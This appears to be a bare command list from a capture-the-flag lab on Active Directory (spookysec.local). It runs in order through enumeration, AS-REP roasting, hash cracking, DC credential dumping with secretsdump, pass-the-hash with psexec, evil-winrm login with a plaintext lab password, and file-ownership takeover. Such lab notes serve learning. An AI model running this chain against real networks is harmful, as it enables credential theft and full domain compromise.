https://0xsmiley.github.io/2020-04-26-AttacktiveDir/
https://xmind.app/m/874LNH/#
https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet

nmap -p53,80,88,135,139,389,445,464,593,636,3268,3269,3389 -A -T4 spookysec.local

enum4linux -A  spookysec.local

~/go/bin/kerbrute userenum --dc spookysec.local -d spookysec.local userlist.txt

python3 GetNPUsers.py spookysec.local/svc-admin

hashcat -m 18200 hash.txt passwordlist.txt --force

smbclient -L spookysec.local --user svc-admin

smbclient \\\\spookysec.local\\backup --user svc-admin

python3 secretsdump.py -just-dc backup@spookysec.local

python3 psexec.py Administrator:@spookysec.local -hashes <Complete Hash>

evil-winrm -i 10.10.89.72 -u a-whitehat -p bNdKVkjv3RR9ht

Get-ADUser $env:username -Properties MemberOf

Get-ChildItem -Path C:\Users -Include *user.txt* -Recurse | Get-Content

icacls "C:\Users\Administrator\Desktop\system.txt"

takeown /F "C:\Users\Administrator\Desktop\system.txt

icacls "C:\Users\Administrator\Desktop\system.txt" /grant a-whitehat:F